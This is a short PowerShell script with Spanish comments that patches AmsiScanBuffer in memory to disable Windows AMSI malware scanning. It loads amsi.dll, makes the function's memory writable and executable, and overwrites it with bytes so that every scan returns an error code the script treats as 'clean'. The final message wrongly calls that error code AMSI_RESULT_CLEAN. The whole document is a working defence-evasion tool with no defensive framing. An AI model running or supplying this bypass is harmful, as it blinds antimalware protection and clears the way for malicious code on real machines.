# ===== CARGA MANUAL DE GetProcAddress, LoadLibrary y VirtualProtect DESDE PowerShell =====
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

# Compilamos en memoria
Add-Type $Kernel32

# Resolvemos amsi.dll y AmsiScanBuffer
$amsi = [Kernel32]::LoadLibrary("amsi.dll")
$addr = [Kernel32]::GetProcAddress($amsi, "AmsiScanBuffer")

Write-Host "[+] AmsiScanBuffer encontrada en: 0x$($addr.ToString("X12"))"

# Cambiamos protección de la memoria a RWX (0x40)
$old = 0
[Kernel32]::VirtualProtect($addr, [uint32]6, 0x40, [ref]$old) | Out-Null

# Patch clásico: mov eax, 0x80070057; ret   →  EAX = E_INVALIDARG → AMSI siempre devuelve "limpio"
$1 = "0xB8"
$2 = "0x57"
$3 = "0x00"
$4 = "0x07"
$5 = "0x80"
$6 = "0xC3"

$patch = [Byte[]] ($1, $2, $3, $4, $5, $6)   # mov eax, 0x80070057; ret

# Aplicamos el parche en memoria
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)

Write-Host "[+] AMSI BYPASSEADO → AmsiScanBuffer ahora siempre devuelve AMSI_RESULT_CLEAN (0x80070057)"
